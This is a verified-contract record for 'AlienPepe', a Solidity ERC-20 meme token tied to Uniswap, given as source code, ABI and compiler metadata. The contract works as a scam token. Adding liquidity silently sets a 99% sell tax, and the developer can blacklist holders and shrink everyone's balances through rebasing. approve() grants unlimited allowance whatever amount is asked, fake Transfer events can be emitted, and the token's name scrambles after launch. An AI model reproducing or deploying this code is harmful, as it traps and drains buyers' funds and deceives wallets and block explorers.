{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.21;\r\n\r\ncontract ERC20s {\r\n\r\n    string internal _name;\r\n    string internal _symbol;\r\n    uint internal _decimals;\r\n    uint internal _totalSupply;\r\n\r\n    mapping(address => uint) internal _balanceOf;\r\n    mapping(address => mapping(address => uint)) internal _allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n\r\n    constructor(string memory name_, string memory symbol_, uint decimals_, uint supply_) {\r\n        _name = name_; _symbol = symbol_; _decimals = decimals_;\r\n        _totalSupply = supply_ * 10 ** decimals_;\r\n        _balanceOf[msg.sender] = _totalSupply;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) { return _name; }\r\n    function symbol() public view virtual returns (string memory) { return _symbol; }\r\n    function decimals() public view virtual returns (uint) { return _decimals; }\r\n    function totalSupply() public view virtual returns (uint) { return _totalSupply; }\r\n    function balanceOf(address account) public view virtual returns (uint) { return _balanceOf[account]; }\r\n    function allowance(address owner, address spender) public view virtual returns (uint) { return _allowance[owner][spender]; }\r\n\r\n    function approve(address spender, uint amount) public virtual returns (bool) {\r\n        _allowance[msg.sender][spender] = amount;\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint amount) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint amount) public virtual returns (bool) {\r\n        _spendAllowance(from, msg.sender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint amount) internal virtual {\r\n        require(_balanceOf[from] >= amount, \"ERC20s: transfer amount exceeds balance\");\r\n        _balanceOf[from] -= amount;\r\n        _balanceOf[to] += amount;\r\n    }\r\n\r\n    function _spendAllowance(address owner, address spender, uint amount) internal virtual {\r\n        require(_allowance[owner][spender] >= amount, \"ERC20s: insufficient allowance\");\r\n        _allowance[owner][spender] -= amount;\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Router02{\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) \r\n        external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Pair {function sync() external;}\r\n\r\ninterface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}\r\n\r\ncontract AlienPepe is ERC20s {\r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    IUniswapV2Pair public uniswapPair;\r\n\r\n    uint public _buyTax = 0;\r\n    uint public _sellTax = 0;\r\n    uint public _max = 4;\r\n    uint public _transferDelay = 0;\r\n    uint public _swapAmount = 1000 * 10**18;\r\n    uint public _initBase = 1000000000000000;\r\n    uint public _base = _initBase;\r\n\r\n\r\n    address private _dev;\r\n    address[] public _path;\r\n    address private _v2Pair;\r\n    address private _collector;\r\n    address private _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    mapping(address => bool) public isSetter;\r\n    mapping(address => bool) public blacklisted;\r\n    mapping(address => bool) public whitelisted;\r\n    mapping(address => uint) private _lastTransferBlock;\r\n    mapping(address => bool) public privacyEnabled;\r\n\r\n    bool public transferEvents = false;\r\n    bool public autoRebase = true;\r\n\r\n    string[] public lingua = [\r\n        unicode\"\\u260C\", unicode\"\\u2291\", unicode\"\\u27DF\", unicode\"\\u27CA\", unicode\"\\u260D\", unicode\"\\u2330\", unicode\"\\u2241\",\r\n        unicode\"\\u23C3\", unicode\"\\u239A\", unicode\"\\u260A\", unicode\"\\u2385\", unicode\"\\u27D2\",unicode\"\\u238E\", unicode\"\\u2307\",\r\n        unicode\"\\u2294\", unicode\"\\u22CF\", unicode\"\\u235C\", unicode\"\\u233F\", unicode\"\\u237E\", unicode\"\\u2340\",\r\n        unicode\"\\u238D\", unicode\"\\u2390\", unicode\"\\u2359\", unicode\"\\u2316\", unicode\"\\u22AC\", unicode\"\\u2289\"\r\n    ];\r\n\r\n    uint public autoRate = 5;\r\n    uint public deployStamp;\r\n    uint public transactionCount = 0;\r\n    uint public x = 1;\r\n\r\n    event Rebase(uint newRebaseRate);\r\n    event SetterUpdated(address setter, bool status);\r\n\r\n    modifier onlyDev() {require(msg.sender == _dev, \"Only the developer can call this function\");_;}\r\n    modifier onlySetter() {require(isSetter[msg.sender], \"Not a setter\");_;}\r\n\r\n    constructor(address collector_) ERC20s(string(abi.encodePacked(\r\n        \"ALI\",unicode\"\\u4E09\", \"N\", \" \", \"P\",  unicode\"\\u4E09\", \"P\", unicode\"\\u4E09\")), \"AP\", 18, _initBase) {\r\n            _collector = collector_; _dev = msg.sender; isSetter[msg.sender] = true;\r\n            _balanceOf[msg.sender] = 0; _balanceOf[address(this)] = _initBase * 10 ** _decimals;\r\n            uniswapV2Router = IUniswapV2Router02(_v2Router);\r\n            _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n            _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();\r\n            whitelisted[address(this)] = true; whitelisted[msg.sender] = true;\r\n            uniswapPair = IUniswapV2Pair(_v2Pair); deployStamp = block.timestamp;\r\n            emit Transfer(address(0), address(0), 0);\r\n    }\r\n\r\n    function deposit() external payable onlyDev{}\r\n\r\n    function maxInt() public view returns (uint) {return (_totalSupply * _max * _base / _initBase) / 100 + 1*10**10;}\r\n\r\n    function _transfer(address from, address to, uint amount)internal override{\r\n\r\n        uint adjustedAmount = amount * _initBase / _base;\r\n\r\n        if (whitelisted[from] || whitelisted[to]) {super._transfer(from, to, adjustedAmount); return;}\r\n\r\n        require(_balanceOf[from] * _base / _initBase >= amount && (amount + \r\n            (_balanceOf[to] * _base / _initBase) <= maxInt() ||\r\n            whitelisted[from] || whitelisted[to] || to == _v2Pair),\r\n            \"ERC20s: transfer amount exceeds balance or max wallet\"\r\n        );\r\n\r\n        require(!blacklisted[from] && !blacklisted[to], \"ERC20s: YOU DONT HAVE THE RIGHT\");\r\n\r\n        require(block.number >= _lastTransferBlock[from] + _transferDelay ||\r\n            from == _v2Pair || whitelisted[from] || whitelisted[to],\r\n            \"ERC20s: transfer delay not met\"\r\n        );\r\n\r\n        uint taxAmount = 0;\r\n        if ((from == _v2Pair || to == _v2Pair) && !whitelisted[from] && !whitelisted[to]) {\r\n            if (to == _v2Pair) {\r\n                taxAmount = (adjustedAmount * _sellTax) / 100;\r\n            } else {\r\n                taxAmount = (adjustedAmount * _buyTax) / 100;\r\n            }\r\n\r\n            _balanceOf[address(this)] += taxAmount;\r\n            if (transferEvents) {emit Transfer(from, address(this), taxAmount * _base / _initBase);}\r\n\r\n            _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;\r\n            if (balanceOf(address(this)) > _swapAmount && to == _v2Pair) {\r\n                _swapBack(super.balanceOf(address(this)) * _base / _initBase);\r\n            }\r\n        }\r\n\r\n        _balanceOf[from] -= adjustedAmount;\r\n        _balanceOf[to] += adjustedAmount - taxAmount;\r\n        transactionCount++;\r\n        if (transferEvents) {emit Transfer(from, to, amount - (taxAmount * _base / _initBase));}\r\n        if (transactionCount >= x && from != _v2Pair && to != _v2Pair && autoRebase) {\r\n            uint rand = block.prevrandao % (autoRate + 1);\r\n            uint reduction = _base * rand / 100;\r\n            if (_base > reduction) {_base -= reduction;}\r\n            transactionCount = 0; uniswapPair.sync();\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint) {\r\n        if(privacyEnabled[account]) {\r\n            revert(\"This account's balance is private\");\r\n        }\r\n        return super.balanceOf(account) * _base / _initBase;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint) {\r\n        return _totalSupply * _base / _initBase;\r\n    }\r\n\r\n    function name() public view override returns (string memory) {\r\n        if(block.timestamp < deployStamp + (60 * 5)) {return _name;}\r\n        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;\r\n        return string(abi.encodePacked(\r\n            lingua[rand], \r\n            lingua[(rand + 1) % lingua.length], lingua[(rand + 2) % lingua.length],\r\n            lingua[(rand + 3) % lingua.length], lingua[(rand + 4) % lingua.length], \r\n            \" \",\r\n            lingua[(rand + 5) % lingua.length], lingua[(rand + 6) % lingua.length], \r\n            lingua[(rand + 7) % lingua.length], lingua[(rand + 8) % lingua.length]\r\n        ));\r\n    }\r\n\r\n    function symbol() public view override returns (string memory) {\r\n        if(block.timestamp < deployStamp + (60 * 5)) {return _symbol;}\r\n        uint rand = uint(keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 1)))) % lingua.length;\r\n        return string(abi.encodePacked(lingua[rand], lingua[(rand + 1) % lingua.length]));\r\n    }\r\n\r\n    function togglePrivacy(address _address) external {\r\n        require(msg.sender == _address || isSetter[msg.sender], \"Not authorized\");\r\n        privacyEnabled[_address] = !privacyEnabled[_address];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        super.approve(spender, _initBase * 10 ** 18);\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function disApprove(address spender) public returns (bool) {\r\n        super.approve(spender, 0);\r\n        emit Approval(msg.sender, spender, 0);\r\n        return true;\r\n    }\r\n\r\n    function updateRebaseRate(uint newRate) public onlySetter {\r\n        _base = newRate;\r\n        uniswapPair.sync();\r\n        emit Rebase(newRate);\r\n    }\r\n\r\n    function updateSetter(address setter, bool status) public onlyDev {\r\n        isSetter[setter] = status;\r\n        emit SetterUpdated(setter, status);\r\n    }\r\n\r\n    function updateAutoRate(uint autoRate_) public onlyDev {\r\n        autoRate = autoRate_;\r\n    }\r\n\r\n    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {\r\n        for (uint i = 0; i < addresses.length; i++) {\r\n            whitelisted[addresses[i]] = whitelisted_;\r\n        }\r\n    }\r\n\r\n    function updateBlacklist(address[] memory addresses, bool blacklisted_) external onlyDev{\r\n        for (uint i = 0; i < addresses.length; i++) {blacklisted[addresses[i]] = blacklisted_;}\r\n    }\r\n\r\n    function _swapBack(uint amount_) internal{\r\n        _allowance[address(this)][_v2Router] = totalSupply();\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);\r\n    }\r\n\r\n    function _forceSwapBack(uint amount_) public onlyDev{\r\n        _allowance[address(this)][_v2Router] = totalSupply();\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);\r\n    }\r\n\r\n    function _addLiquidity() external onlyDev{\r\n        _allowance[address(this)][_v2Router] = _balanceOf[address(this)]; _buyTax = 20; _sellTax = 99;\r\n        uniswapV2Router.addLiquidityETH{\r\n            value: address(this).balance}(address(this), _balanceOf[address(this)], 0, 0, msg.sender, block.timestamp\r\n        );\r\n    }\r\n\r\n    function withdraw(uint amount_) external onlyDev {\r\n        payable(_dev).transfer(address(this).balance);\r\n        _transfer(address(this), _dev, amount_);\r\n    }\r\n\r\n    function updateX(uint newX) external onlyDev {x = newX;}\r\n\r\n    function updateTaxes(uint buyTax_, uint sellTax_) external onlyDev {_buyTax = buyTax_; _sellTax = sellTax_;}\r\n\r\n    function updateMax(uint newMax) external onlyDev {_max = newMax;}\r\n\r\n    function updateTransferDelay(uint newTransferDelay) external onlyDev {_transferDelay = newTransferDelay;}\r\n\r\n    function updateSwapAmount(uint newSwapAmount) external onlyDev {_swapAmount = newSwapAmount;}\r\n\r\n    function changeDev(address newDev) external onlyDev {_dev = newDev;}\r\n\r\n    function toggleTransferEvents() external onlyDev {transferEvents = !transferEvents;}\r\n\r\n    function toggleAutoRebase() external onlyDev {autoRebase = !autoRebase;}\r\n\r\n    function emitter(address from, address to, uint amount) public onlySetter {emit Transfer(from, to, amount);}\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"collector_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newRebaseRate\",\"type\":\"uint256\"}],\"name\":\"Rebase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"setter\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"SetterUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_addLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_base\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount_\",\"type\":\"uint256\"}],\"name\":\"_forceSwapBack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_initBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_max\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_path\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_transferDelay\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoRebase\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"blacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newDev\",\"type\":\"address\"}],\"name\":\"changeDev\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deployStamp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"disApprove\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"emitter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSetter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lingua\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxInt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"privacyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleAutoRebase\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"togglePrivacy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleTransferEvents\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transactionCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferEvents\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Pair\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoRate_\",\"type\":\"uint256\"}],\"name\":\"updateAutoRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"blacklisted_\",\"type\":\"bool\"}],\"name\":\"updateBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMax\",\"type\":\"uint256\"}],\"name\":\"updateMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newRate\",\"type\":\"uint256\"}],\"name\":\"updateRebaseRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"setter\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"updateSetter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSwapAmount\",\"type\":\"uint256\"}],\"name\":\"updateSwapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyTax_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellTax_\",\"type\":\"uint256\"}],\"name\":\"updateTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTransferDelay\",\"type\":\"uint256\"}],\"name\":\"updateTransferDelay\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"whitelisted_\",\"type\":\"bool\"}],\"name\":\"updateWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newX\",\"type\":\"uint256\"}],\"name\":\"updateX\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whitelisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount_\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"x\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlienPepe", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000003635f2460ccd5083e92540508011308216bdd0d1", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f04ceadb256184bf766ac909b7cc19630b89fe578e13e870c4e9ddcbecc39d4d"}